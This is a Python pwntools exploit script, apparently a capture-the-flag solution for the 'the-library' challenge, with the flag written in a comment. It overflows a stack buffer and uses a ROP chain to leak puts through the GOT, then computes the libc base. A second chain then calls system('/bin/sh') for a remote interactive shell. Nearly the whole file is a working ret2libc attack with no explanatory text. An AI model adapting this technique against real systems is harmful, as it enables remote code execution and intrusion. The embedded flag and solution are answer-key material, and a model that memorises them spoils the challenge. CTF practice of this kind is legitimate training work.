#!/usr/bin/env python3

#flag{jump_1nt0_th3_l1brary}

from pwn import *

elf = ELF("./the-library")
libc = ELF("./libc.so.6")
#ld = ELF("./ld-2.27.so")

context.binary = elf

"""
def conn():
        return process([ld.path, elf.path], env={"LD_PRELOAD": libc.path})
"""

def main():
    #r = process("./the-library")

    r = remote("2020.redpwnc.tf", 31350)

    offset = 16 + 8

    PopRdi = p64(0x0000000000400733)
    ret = p64(0x0000000000400506)

    main = 0x0000000000400637

    payload = b"M"*offset
    payload += PopRdi
    payload += p64(elf.got["puts"])
    payload += p64(elf.plt["puts"])
    payload += p64(main)



    print(r.recvline())
    r.sendline(payload)

    for i in range(2):
    	r.recvline()

    puts = r.recvline()
    puts = puts.decode("ISO-8859-1")
    puts = puts[:-1:]
    puts = u64(puts + "\x00"*(8 - len(puts)))

    log.info("Puts @ 0x%x", puts)

    r.recvline() #New main
    libc_base = puts - libc.sym['puts']
    binsh = libc_base + 0x1b3e9a #0x1b75aa #0x1b3e9a
    system = libc_base + libc.sym['system']

    log.info("/bin/sh 0x%x", binsh)
    pause()
    payload2  = b"M"*offset
    payload2 += PopRdi
    payload2 += p64(binsh)
    payload2 += ret
    payload2 += p64(system)

    r.sendline(payload2)

    r.interactive()



if __name__ == "__main__":
    main()
